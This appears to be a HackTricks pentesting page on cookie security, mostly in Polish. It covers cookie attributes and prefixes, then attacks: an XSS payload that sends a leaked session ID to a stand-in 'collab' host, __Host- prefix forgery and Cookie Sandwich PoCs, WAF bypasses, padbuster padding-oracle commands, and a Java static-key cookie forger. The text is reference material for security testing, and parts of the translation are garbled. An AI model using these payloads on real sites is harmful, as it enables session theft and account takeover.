# Cookies Hacking

{{#include ../../banners/hacktricks-training.md}}

## Cookie Attributes

Cookies mają kilka atrybutów, które kontrolują ich zachowanie w przeglądarce użytkownika. Poniżej przedstawiono przegląd tych atrybutów w bardziej biernym stylu:

### Expires and Max-Age

Data wygaśnięcia cookie jest określana przez atrybut `Expires`. Natomiast atrybut `Max-age` definiuje czas w sekundach do usunięcia cookie. **Wybierz `Max-age`, ponieważ odzwierciedla bardziej nowoczesne praktyki.**

### Domain

Hosty, które mają otrzymać cookie, są określane przez atrybut `Domain`. Domyślnie jest on ustawiony na hosta, który wystawił cookie, bez uwzględniania subdomen. Jednak gdy atrybut `Domain` jest ustawiony jawnie, obejmuje także subdomeny. Sprawia to, że określenie atrybutu `Domain` jest mniej restrykcyjne, przydatne gdy konieczne jest współdzielenie cookie między subdomenami. Na przykład ustawienie `Domain=mozilla.org` sprawia, że cookies są dostępne na subdomenach, takich jak `developer.mozilla.org`.

### Path

Atrybut `Path` wskazuje konkretną ścieżkę URL, która musi być obecna w żądanym URL, aby nagłówek `Cookie` został wysłany. Atrybut ten traktuje znak `/` jako separator katalogów, co pozwala na dopasowania w podkatalogach.

### Ordering Rules

Gdy dwa cookies mają taką samą nazwę, wybór tego, który zostanie wysłany, zależy od:

- cookie dopasowanego do najdłuższej ścieżki w żądanym URL.
- najświeżej ustawionego cookie, jeśli ścieżki są identyczne.

### SameSite

- Atrybut `SameSite` określa, czy cookies są wysyłane w żądaniach pochodzących z domen trzecich. Oferuje trzy ustawienia:
- **Strict**: uniemożliwia wysłanie cookie w żądaniach z domen trzecich.
- **Lax**: pozwala na wysłanie cookie w żądaniach GET inicjowanych przez strony trzecie.
- **None**: zezwala na wysłanie cookie z dowolnej domeny trzeciej.

Pamiętaj, że konfigurując cookies, zrozumienie tych atrybutów pomaga zapewnić ich oczekiwane zachowanie w różnych scenariuszach.

| **Request Type** | **Example Code**                   | **Cookies Sent When** |
| ---------------- | ---------------------------------- | --------------------- |
| Link             | \<a href="...">\</a>               | NotSet\*, Lax, None   |
| Prerender        | \<link rel="prerender" href=".."/> | NotSet\*, Lax, None   |
| Form GET         | \<form method="GET" action="...">  | NotSet\*, Lax, None   |
| Form POST        | \<form method="POST" action="..."> | NotSet\*, None        |
| iframe           | \<iframe src="...">\</iframe>      | NotSet\*, None        |
| AJAX             | $.get("...")                       | NotSet\*, None        |
| Image            | \<img src="...">                   | NetSet\*, None        |

Table from [Invicti](https://www.netsparker.com/blog/web-security/same-site-cookie-attribute-prevent-cross-site-request-forgery/) and slightly modified.\
Cookie z atrybutem _**SameSite**_ będzie **łagodzić ataki CSRF**, gdy potrzebna jest zalogowana sesja.

**\*Notice that from Chrome80 (feb/2019) the default behaviour of a cookie without a cookie samesite** **attribute will be lax** ([https://www.troyhunt.com/promiscuous-cookies-and-their-impending-death-via-the-samesite-policy/](https://www.troyhunt.com/promiscuous-cookies-and-their-impending-death-via-the-samesite-policy/)).\
Zauważ, że tymczasowo, po zastosowaniu tej zmiany, **cookies bez polityki SameSite** w Chrome będą **traktowane jako None** podczas **pierwszych 2 minut**, a następnie jako **Lax** dla top-level cross-site POST request.

## Cookies Flags

### HttpOnly

To uniemożliwia **client** dostęp do cookie (np. przez **Javascript**: `document.cookie`)

#### **Bypasses**

- Jeśli strona **wysyła cookies w odpowiedzi** na żądanie (na przykład na stronie **PHPinfo**), możliwe jest wykorzystanie XSS do wysłania zapytania do tej strony i **wykradzenia cookies** z odpowiedzi (zobacz przykład na [https://blog.hackcommander.com/posts/2022/11/12/bypass-httponly-via-php-info-page/](https://blog.hackcommander.com/posts/2022/11/12/bypass-httponly-via-php-info-page/)).
- To można obejść za pomocą żądań **TRACE** **HTTP**, ponieważ odpowiedź serwera (jeśli ta metoda jest dostępna) będzie odzwierciedlać wysłane cookies. Ta technika nazywa się **Cross-Site Tracking**.
- Tę technikę powstrzymują **nowoczesne przeglądarki, uniemożliwiając wysyłanie żądania TRACE z JS**. Jednak znaleziono pewne obejścia w konkretnym oprogramowaniu, np. wysyłając `\r\nTRACE` zamiast `TRACE` do IE6.0 SP2.
- Innym sposobem jest wykorzystanie zero/day podatności przeglądarek.
- Możliwe jest **nadpisanie HttpOnly cookies** poprzez przeprowadzenie ataku Cookie Jar overflow:


{{#ref}}
cookie-jar-overflow.md
{{#endref}}

- Można użyć [**Cookie Smuggling**](#cookie-smuggling) attack do eksfiltracji tych cookies
- Jeśli jakiś serwerowy endpoint odzwierciedla surowe session ID w odpowiedzi HTTP (np. wewnątrz komentarzy HTML lub bloku debug), możesz obejść HttpOnly używając gadżetu XSS do pobrania tego endpointu, wyciągnięcia sekretu za pomocą regex i wyeksfiltracji go. Przykładowy wzorzec payloadu XSS:
```js
// Extract content between <!-- startscrmprint --> ... <!-- stopscrmprint -->
const re = /<!-- startscrmprint -->([\s\S]*?)<!-- stopscrmprint -->/;
fetch('/index.php?module=Touch&action=ws')
.then(r => r.text())
.then(t => { const m = re.exec(t); if (m) fetch('https://collab/leak', {method:'POST', body: JSON.stringify({leak: btoa(m[1])})}); });
```
### Bezpieczne

Przeglądarka wyśle cookie w żądaniu HTTP **tylko** jeśli żądanie jest przesyłane przez bezpieczny kanał (zazwyczaj **HTTPS**).

## Prefiksy Cookies

Cookies z prefiksem `__Secure-` muszą być ustawione razem z flagą `secure` na stronach zabezpieczonych przez HTTPS.

Dla cookies z prefiksem `__Host-` musi być spełnionych kilka warunków:

- Muszą być ustawione z flagą `secure`.
- Muszą pochodzić ze strony zabezpieczonej przez HTTPS.
- Nie mogą określać domeny, co zapobiega ich wysyłaniu do subdomen.
- Ścieżka dla tych cookies musi być ustawiona na `/`.

Ważne jest, że cookies z prefiksem `__Host-` nie mogą być wysyłane do superdomen ani subdomen. To ograniczenie pomaga w izolacji cookies aplikacji. Dlatego stosowanie prefiksu `__Host-` dla wszystkich cookies aplikacji można uznać za dobrą praktykę zwiększającą bezpieczeństwo i izolację.

### Nadpisywanie cookies

Jednym z zabezpieczeń cookies z prefiksem `__Host-` jest uniemożliwienie ich nadpisania z poziomu subdomen. Zapobiega to na przykład [**Cookie Tossing attacks**](cookie-tossing.md). W talku [**Cookie Crumbles: Unveiling Web Session Integrity Vulnerabilities**](https://www.youtube.com/watch?v=F_wAzF4a7Xg) ([**paper**](https://www.usenix.org/system/files/usenixsecurity23-squarcina.pdf)) przedstawiono, że możliwe było ustawienie \_\_HOST- prefixed cookies z subdomeny, oszukując parser — na przykład dodając "=" na początku lub na początku i na końcu...:

<figure><img src="../../images/image (6) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Albo w PHP możliwe było dodanie **innych znaków na początku** nazwy cookie, które były **zamieniane na znaki podkreślenia**, umożliwiając nadpisanie `__HOST-` cookies:

<figure><img src="../../images/image (7) (1) (1) (1) (1).png" alt="" width="373"><figcaption></figcaption></figure>


#### Unicode whitespace cookie-name smuggling (prefix forgery)

Wykorzystaj rozbieżności w parsowaniu między przeglądarką a serwerem przez dopisanie znaku białej spacji Unicode na początku nazwy cookie. Przeglądarka nie uzna nazwy za dosłownie zaczynającą się od `__Host-`/`__Secure-`, więc pozwoli ustawić ją z subdomeny. Jeśli backend obcina/normalizuje wiodące znaki białej spacji Unicode w kluczach cookie, zobaczy chronioną nazwę i może nadpisać cookie o wysokich uprawnieniach.

- PoC z subdomeny, która może ustawiać cookies domeny nadrzędnej:
```js
document.cookie = `${String.fromCodePoint(0x2000)}__Host-name=injected; Domain=.example.com; Path=/;`;
```
- Typowe zachowanie backendu, które umożliwia ten problem:
- Frameworki, które obcinają/normalizują klucze cookie. W Django, Python’s `str.strip()` usuwa szeroki zakres punktów kodowych białych znaków Unicode, powodując normalizację nazwy do `__Host-name`.
- Często obcinane punkty kodowe obejmują: U+0085 (NEL, 133), U+00A0 (NBSP, 160), U+1680 (5760), U+2000–U+200A (8192–8202), U+2028 (8232), U+2029 (8233), U+202F (8239), U+205F (8287), U+3000 (12288).
- Wiele frameworków rozwiązuje duplikaty nazw cookie zasadą „ostatni wygrywa”, więc kontrolowana przez atakującego znormalizowana wartość cookie nadpisuje prawidłową.

- Różnice między przeglądarkami mają znaczenie:
- Safari blokuje wielobajtowe białe znaki Unicode w nazwach cookie (np. odrzuca U+2000), ale nadal dopuszcza jednobajtowe U+0085 i U+00A0, które wiele backendów obcina. Testuj krzyżowo w różnych przeglądarkach.

- Skutek: Umożliwia nadpisanie ciasteczek `__Host-`/`__Secure-` z mniej zaufanych kontekstów (subdomen), co może prowadzić do XSS (jeśli odzwierciedlone), CSRF token override i session fixation.

- Przykład ruchu sieciowego vs widoku na serwerze (U+2000 obecny w nazwie):
```
Cookie: __Host-name=Real; â€€__Host-name=<img src=x onerror=alert(1)>;
```
Wiele backendów dzieli/parsuje, a następnie obcina, w wyniku czego znormalizowany `__Host-name` przyjmuje wartość atakującego.

#### Legacy `$Version=1` cookie splitting on Java backends (prefix bypass)

Niektóre stosy Java (np. Tomcat/Jetty-style) wciąż włączają przestarzałe parsowanie RFC 2109/2965, gdy nagłówek `Cookie` zaczyna się od `$Version=1`. Może to spowodować, że serwer zinterpretuje pojedynczy ciąg cookie jako wiele logicznych ciasteczek i zaakceptuje sfałszowany wpis `__Host-`, który pierwotnie został ustawiony z subdomeny lub nawet z niezabezpieczonego pochodzenia.

- PoC wymuszające przestarzałe parsowanie:
```js
document.cookie = `$Version=1,__Host-name=injected; Path=/somethingreallylong/; Domain=.example.com;`;
```
- Dlaczego to działa:
- Kontrole prefiksów po stronie klienta stosowane są przy ustawianiu, ale serwerowe, legacy parsowanie później rozdziela i normalizuje nagłówek, omijając założenia gwarancji prefiksów `__Host-`/`__Secure-`.

- Gdzie spróbować: Tomcat, Jetty, Undertow, lub frameworki które nadal honorują atrybuty RFC 2109/2965. Połącz z semantyką nadpisywania dla duplikatów nazw.

#### Mechanizm nadpisywania "ostatni wygrywa" dla duplikatów nazw

When two cookies normalize to the same name, many backends (including Django) use the last occurrence. After smuggling/legacy-splitting produces two `__Host-*` names, the attacker-controlled one will typically win.

#### Wykrywanie i narzędzia

Użyj Burp Suite, aby sprawdzić te warunki:

- Spróbuj wielu prowadzących znaków białej spacji Unicode: U+2000, U+0085, U+00A0 i obserwuj, czy backend przycina i traktuje nazwę jako posiadającą prefiks.
- Wyślij `$Version=1` najpierw w nagłówku Cookie i sprawdź, czy backend wykonuje legacy splitting/normalizację.
- Obserwuj rozstrzyganie duplikatów nazw (pierwszy vs ostatni wygrywa) poprzez wstrzyknięcie dwóch ciasteczek, które normalizują się do tej samej nazwy.
- Burp Custom Action to automate this: [CookiePrefixBypass.bambda](https://github.com/PortSwigger/bambdas/blob/main/CustomAction/CookiePrefixBypass.bambda)

> Wskazówka: These techniques exploit RFC 6265’s octet-vs-string gap: browsers send bytes; servers decode and may normalize/trim. Mismatches in decoding and normalization are the core of the bypass.

## Ataki na Cookies

If a custom cookie contains sensitive data check it (specially if you are playing a CTF), as it might be vulnerable.

### Dekodowanie i modyfikacja Cookies

Sensitive data embedded in cookies should always be scrutinized. Cookies encoded in Base64 or similar formats can often be decoded. This vulnerability allows attackers to alter the cookie's content and impersonate other users by encoding their modified data back into the cookie.

### Session Hijacking

This attack involves stealing a user's cookie to gain unauthorized access to their account within an application. By using the stolen cookie, an attacker can impersonate the legitimate user.

### Session Fixation

In this scenario, an attacker tricks a victim into using a specific cookie to log in. If the application does not assign a new cookie upon login, the attacker, possessing the original cookie, can impersonate the victim. This technique relies on the victim logging in with a cookie supplied by the attacker.

If you found an **XSS in a subdomain** or you **control a subdomain**, read:


{{#ref}}
cookie-tossing.md
{{#endref}}

### Session Donation

Here, the attacker convinces the victim to use the attacker's session cookie. The victim, believing they are logged into their own account, will inadvertently perform actions in the context of the attacker's account.

If you found an **XSS in a subdomain** or you **control a subdomain**, read:


{{#ref}}
cookie-tossing.md
{{#endref}}

### [JWT Cookies](../hacking-jwt-json-web-tokens.md)

Click on the previous link to access a page explaining possible flaws in JWT.

JSON Web Tokens (JWT) used in cookies can also present vulnerabilities. For in-depth information on potential flaws and how to exploit them, accessing the linked document on hacking JWT is recommended.

### Cross-Site Request Forgery (CSRF)

This attack forces a logged-in user to execute unwanted actions on a web application in which they're currently authenticated. Attackers can exploit cookies that are automatically sent with every request to the vulnerable site.

### Empty Cookies

(Check further details in the[original research](https://blog.ankursundara.com/cookie-bugs/)) Browsers permit the creation of cookies without a name, which can be demonstrated through JavaScript as follows:
```js
document.cookie = "a=v1"
document.cookie = "=test value;" // Setting an empty named cookie
document.cookie = "b=v2"
```
W wysyłanym nagłówku cookie znajduje się `a=v1; test value; b=v2;`. Co ciekawe, umożliwia to manipulację cookie, jeśli zostanie ustawiony cookie o pustej nazwie — potencjalnie można kontrolować inne cookie, ustawiając pusty cookie na konkretną wartość:
```js
function setCookie(name, value) {
document.cookie = `${name}=${value}`
}

setCookie("", "a=b") // Setting the empty cookie modifies another cookie's value
```
To powoduje, że przeglądarka wysyła nagłówek cookie, który każdy serwer WWW interpretuje jako cookie o nazwie `a` i wartości `b`.

#### Błąd w Chrome: Unicode Surrogate Codepoint Issue

W Chrome, jeśli Unicode surrogate codepoint jest częścią set cookie, `document.cookie` zostaje uszkodzony i w rezultacie zwraca pusty ciąg znaków:
```js
document.cookie = "\ud800=meep"
```
To powoduje, że `document.cookie` zwraca pusty ciąg znaków, co wskazuje na trwałe uszkodzenie.

#### Cookie Smuggling Due to Parsing Issues

(Check further details in the[original research](https://blog.ankursundara.com/cookie-bugs/)) Kilka serwerów WWW, w tym te z Java (Jetty, TomCat, Undertow) oraz Python (Zope, cherrypy, web.py, aiohttp, bottle, webob), błędnie obsługuje ciągi cookie z powodu przestarzałego wsparcia RFC2965. Odczytują one wartość cookie w podwójnych cudzysłowach jako pojedynczą wartość, nawet jeśli zawiera ona średniki, które normalnie powinny rozdzielać pary klucz-wartość:
```
RENDER_TEXT="hello world; JSESSIONID=13371337; ASDF=end";
```
#### Cookie Injection Vulnerabilities

(Check further details in the[original research](https://blog.ankursundara.com/cookie-bugs/)) Nieprawidłowe parsowanie cookie przez serwery, w szczególności Undertow, Zope oraz te używające Python's `http.cookie.SimpleCookie` i `http.cookie.BaseCookie`, stwarza możliwości przeprowadzenia cookie injection. Te serwery nieprawidłowo rozgraniczają początek nowych cookie, co pozwala atakującym na podszywanie się pod cookie:

- Undertow oczekuje nowego cookie bezpośrednio po wartości w cudzysłowie, bez średnika.
- Zope szuka przecinka, aby rozpocząć parsowanie następnego cookie.
- Klasy cookie Pythona rozpoczynają parsowanie od znaku spacji.

Ta podatność jest szczególnie niebezpieczna w aplikacjach webowych polegających na ochronie CSRF opierającej się na cookie, ponieważ pozwala atakującym wstrzykiwać sfałszowane cookie z tokenem CSRF, potencjalnie omijając mechanizmy zabezpieczeń. Problem pogłębia sposób, w jaki Python obsługuje zduplikowane nazwy cookie — ostatnie wystąpienie nadpisuje wcześniejsze. Budzi to też obawy dotyczące `__Secure-` i `__Host-` cookie w niebezpiecznych kontekstach i może prowadzić do obejść autoryzacji, gdy cookie są przekazywane do back-end servers podatnych na spoofing.

### Cookies $version

#### WAF Bypass

According to [**this blogpost**](https://portswigger.net/research/bypassing-wafs-with-the-phantom-version-cookie), możliwe jest użycie atrybutu cookie **`$Version=1`** aby sprawić, że backend użyje starej logiki parsowania cookie ze względu na **RFC2109**. Ponadto inne wartości, takie jak **`$Domain`** i **`$Path`**, mogą być użyte do zmiany zachowania backendu względem cookie.

#### Cookie Sandwich Attack

According to [**this blogpost**](https://portswigger.net/research/stealing-httponly-cookies-with-the-cookie-sandwich-technique) możliwe jest użycie Cookie Sandwich Attack do kradzieży HttpOnly cookie. Oto wymagania i kroki:

- Znajdź miejsce, gdzie pozornie bezużyteczne **cookie jest reflektowane w odpowiedzi**
- **Utwórz cookie o nazwie `$Version`** z wartością `1` (możesz to zrobić w ataku XSS z poziomu JS) z bardziej specyficzną ścieżką, aby uzyskało początkową pozycję (niektóre frameworki, jak python, nie potrzebują tego kroku)
- **Utwórz cookie, które jest reflektowane** z wartością zostawiającą **otwarty podwójny cudzysłów** i ze specyficzną ścieżką, żeby było umieszczone w bazie cookie po poprzednim (`$Version`)
- Wówczas prawidłowe cookie znajdzie się następne w kolejności
- **Utwórz fałszywe cookie, które zamyka podwójny cudzysłów** wewnątrz swojej wartości

W ten sposób cookie ofiary zostaje uwięzione wewnątrz nowego cookie w wersji 1 i będzie odzwierciedlane za każdym razem, gdy nastąpi jego refleksja.
e.g. from the post:
```javascript
document.cookie = `$Version=1;`;
document.cookie = `param1="start`;
// any cookies inside the sandwich will be placed into param1 value server-side
document.cookie = `param2=end";`;
```
### WAF bypasses

#### Cookies $version

Sprawdź poprzednią sekcję.

#### Bypassing value analysis with quoted-string encoding

To parsowanie powoduje unescape zescape'owanych wartości wewnątrz cookies, więc "\a" staje się "a". Może to być użyteczne do obejścia WAFS, np.:

- `eval('test') => forbidden`
- `"\e\v\a\l\(\'\t\e\s\t\'\)" => allowed`

#### Bypassing cookie-name blocklists

W RFC2109 wskazano, że **przecinek może być użyty jako separator między wartościami cookie**. Możliwe jest też dodanie **spacji i tabulatorów przed i po znaku równości**. Dlatego cookie takie jak `$Version=1; foo=bar, abc = qux` nie generuje cookie `"foo":"bar, admin = qux"` ale cookies `foo":"bar"` i `"admin":"qux"`. Zwróć uwagę, jak wygenerowane są 2 cookies i jak admin stracił spację przed i po znaku równości.

#### Bypassing value analysis with cookie splitting

Wreszcie różne backdoors mogą połączyć w jednym stringu różne cookies przesłane w różnych nagłówkach cookie, np.:
```
GET / HTTP/1.1
Host: example.com
Cookie: param1=value1;
Cookie: param2=value2;
```
Co mogłoby pozwolić na bypass WAF, jak w tym przykładzie:
```
Cookie: name=eval('test//
Cookie: comment')

Resulting cookie: name=eval('test//, comment') => allowed
```
### Dodatkowe sprawdzenia podatnych Cookies

#### **Podstawowe sprawdzenia**

- **cookie** jest **ten sam** za każdym razem, gdy wykonujesz **login**.
- Wyloguj się i spróbuj użyć tego samego **cookie**.
- Spróbuj wykonać **login** na 2 urządzeniach (lub w 2 przeglądarkach) do tego samego konta, używając tego samego **cookie**.
- Sprawdź, czy **cookie** zawiera jakieś informacje i spróbuj je zmodyfikować.
- Spróbuj utworzyć kilka **accounts** o prawie identycznym **username** i sprawdź, czy widać podobieństwa.
- Sprawdź opcję "**remember me**", jeśli istnieje, aby zobaczyć, jak działa. Jeśli istnieje i może być podatna, zawsze używaj cookie z **remember me** bez żadnego innego cookie.
- Sprawdź, czy poprzednie **cookie** działa nawet po zmianie hasła.

#### **Zaawansowane ataki cookies**

Jeśli **cookie** pozostaje takie samo (lub prawie) po wykonaniu **login**, prawdopodobnie oznacza to, że cookie jest związane z jakimś polem twojego konta (prawdopodobnie z **username**). Wtedy możesz:

- Spróbuj utworzyć wiele **accounts** z bardzo podobnymi **username** i spróbuj zgadnąć, jak działa algorytm.
- Spróbuj **bruteforce the username**. Jeśli **cookie** służy wyłącznie jako metoda uwierzytelniania dla twojego **username**, możesz utworzyć konto o **username** "**Bmin**" i **bruteforce** każdy pojedynczy **bit** twojego **cookie**, ponieważ jeden z testowanych cookie będzie należał do "**admin**".
- Wypróbuj **Padding** **Oracle** (możesz odszyfrować zawartość **cookie**). Użyj **padbuster**.

Przykłady Padding Oracle - Padbuster examples
```bash
padbuster <URL/path/when/successfully/login/with/cookie> <COOKIE> <PAD[8-16]>
# When cookies and regular Base64
padbuster http://web.com/index.php u7bvLewln6PJPSAbMb5pFfnCHSEd6olf 8 -cookies auth=u7bvLewln6PJPSAbMb5pFfnCHSEd6olf

# If Base64 urlsafe or hex-lowercase or hex-uppercase --encoding parameter is needed, for example:
padBuster http://web.com/home.jsp?UID=7B216A634951170FF851D6CC68FC9537858795A28ED4AAC6
7B216A634951170FF851D6CC68FC9537858795A28ED4AAC6 8 -encoding 2
```
Padbuster wykona kilka prób i zapyta Cię, który warunek jest warunkiem błędu (ten, który nie jest poprawny).

Następnie rozpocznie decrypting the cookie (może to potrwać kilka minut)

Jeśli atak został pomyślnie przeprowadzony, możesz spróbować encrypt wybranego ciągu znaków. Na przykład, jeśli chciałbyś **encrypt** **user=administrator**
```
padbuster http://web.com/index.php 1dMjA5hfXh0jenxJQ0iW6QXKkzAGIWsiDAKV3UwJPT2lBP+zAD0D0w== 8 -cookies thecookie=1dMjA5hfXh0jenxJQ0iW6QXKkzAGIWsiDAKV3UwJPT2lBP+zAD0D0w== -plaintext user=administrator
```
To wykonanie zwróci cookie poprawnie zaszyfrowane i zakodowane z ciągiem **user=administrator** w środku.

**CBC-MAC**

Może się zdarzyć, że cookie ma jakąś wartość i jest podpisywane przy użyciu CBC. Wtedy integralność wartości to sygnatura utworzona przy użyciu CBC nad tą samą wartością. Ponieważ zaleca się używać jako IV wektora zerowego, tego typu sprawdzanie integralności może być podatne.

**Atak**

1. Uzyskaj sygnaturę nazwy użytkownika **administ** = **t**
2. Uzyskaj sygnaturę nazwy użytkownika **rator\x00\x00\x00 XOR t** = **t'**
3. Ustaw w cookie wartość **administrator+t'** (**t'** będzie ważną sygnaturą **(rator\x00\x00\x00 XOR t) XOR t** = **rator\x00\x00\x00**)

**ECB**

Jeżeli cookie jest szyfrowane przy użyciu ECB, może być podatne.\
Po zalogowaniu cookie, które otrzymujesz, powinno być zawsze takie samo.

Jak wykryć i zaatakować:

Utwórz 2 użytkowników z prawie tymi samymi danymi (username, password, email, etc.) i spróbuj odkryć jakiś wzorzec w otrzymanym cookie

Utwórz użytkownika np. "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa" i sprawdź, czy w cookie pojawia się jakiś wzorzec (ponieważ ECB szyfruje każdy blok tą samą metodą, te same zaszyfrowane bajty mogą się pojawić jeśli username jest szyfrowany).

Powinien być widoczny wzorzec (o rozmiarze używanego bloku). Znając, jak zaszyfrowana jest grupa "a", możesz stworzyć username: "a"\*(size of the block)+"admin". Następnie możesz usunąć zaszyfrowany wzorzec odpowiadający blokowi "a" z cookie. W efekcie otrzymasz cookie dla username "admin".

### Static-key cookie forgery (symmetric encryption of predictable IDs)

Niektóre aplikacje tworzą authentication cookies, szyfrując tylko przewidywalną wartość (np. numeryczny user ID) pod globalnym, hard-coded symmetric key, a następnie kodując ciphertext (hex/base64). Jeśli klucz jest statyczny dla produktu (lub instalacji), każdy może offline sfałszować cookies dla dowolnych użytkowników i ominąć uwierzytelnianie.

How to test/forge
- Zidentyfikuj cookie(s) that gate auth, e.g., COOKIEID and ADMINCOOKIEID.
- Określ cipher/encoding. W jednym rzeczywistym przypadku aplikacja używała IDEA z stałym 16-byte key i zwracała ciphertext jako hex.
- Zweryfikuj poprzez zaszyfrowanie własnego user ID i porównanie z wystawionym cookie. Jeśli pasuje, możesz mint cookies dla dowolnego docelowego ID (1 często odpowiada pierwszemu adminowi).
- Ustaw sfałszowaną wartość bezpośrednio jako cookie i przeglądaj; nie są potrzebne żadne credentials.

<details>
<summary>Minimal Java PoC (IDEA + hex) used in the wild</summary>
```java
import cryptix.provider.cipher.IDEA;
import cryptix.provider.key.IDEAKeyGenerator;
import cryptix.util.core.Hex;
import java.security.Key;
import java.security.KeyException;
import java.io.UnsupportedEncodingException;

public class App {
private String ideaKey = "1234567890123456"; // example static key

public String encode(char[] plainArray) { return encode(new String(plainArray)); }

public String encode(String plain) {
IDEAKeyGenerator keygen = new IDEAKeyGenerator();
IDEA encrypt = new IDEA();
Key key;
try {
key = keygen.generateKey(this.ideaKey.getBytes());
encrypt.initEncrypt(key);
} catch (KeyException e) { return null; }
if (plain.length() == 0 || plain.length() % encrypt.getInputBlockSize() > 0) {
for (int currentPad = plain.length() % encrypt.getInputBlockSize(); currentPad < encrypt.getInputBlockSize(); currentPad++) {
plain = plain + " "; // space padding
}
}
byte[] encrypted = encrypt.update(plain.getBytes());
return Hex.toString(encrypted); // cookie expects hex
}

public String decode(String chiffre) {
IDEAKeyGenerator keygen = new IDEAKeyGenerator();
IDEA decrypt = new IDEA();
Key key;
try {
key = keygen.generateKey(this.ideaKey.getBytes());
decrypt.initDecrypt(key);
} catch (KeyException e) { return null; }
byte[] decrypted = decrypt.update(Hex.fromString(chiffre));
try { return new String(decrypted, "ISO_8859-1").trim(); } catch (UnsupportedEncodingException e) { return null; }
}

public void setKey(String key) { this.ideaKey = key; }
}
```
</details>kontekst (np. server-side session with random ID, lub dodaj właściwości anti-replay).

## References

- [When Audits Fail: Four Critical Pre-Auth Vulnerabilities in TRUfusion Enterprise](https://www.rcesecurity.com/2025/09/when-audits-fail-four-critical-pre-auth-vulnerabilities-in-trufusion-enterprise/)
- [https://blog.ankursundara.com/cookie-bugs/](https://blog.ankursundara.com/cookie-bugs/)
- [https://www.linkedin.com/posts/rickey-martin-24533653_100daysofhacking-penetrationtester-ethicalhacking-activity-7016286424526180352-bwDd](https://www.linkedin.com/posts/rickey-martin-24533653_100daysofhacking-penetrationtester-ethicalhacking-activity-7016286424526180352-bwDd)
- [https://portswigger.net/research/bypassing-wafs-with-the-phantom-version-cookie](https://portswigger.net/research/bypassing-wafs-with-the-phantom-version-cookie)
- [https://seclists.org/webappsec/2006/q2/181](https://seclists.org/webappsec/2006/q2/181)
- [https://www.michalspacek.com/stealing-session-ids-with-phpinfo-and-how-to-stop-it](https://www.michalspacek.com/stealing-session-ids-with-phpinfo-and-how-to-stop-it)
- [https://blog.sicuranext.com/vtenext-25-02-a-three-way-path-to-rce/](https://blog.sicuranext.com/vtenext-25-02-a-three-way-path-to-rce/)
- [Cookie Chaos: How to bypass __Host and __Secure cookie prefixes](https://portswigger.net/research/cookie-chaos-how-to-bypass-host-and-secure-cookie-prefixes)
- [Burp Custom Action – CookiePrefixBypass.bambda](https://github.com/PortSwigger/bambdas/blob/main/CustomAction/CookiePrefixBypass.bambda)

{{#include ../../banners/hacktricks-training.md}}
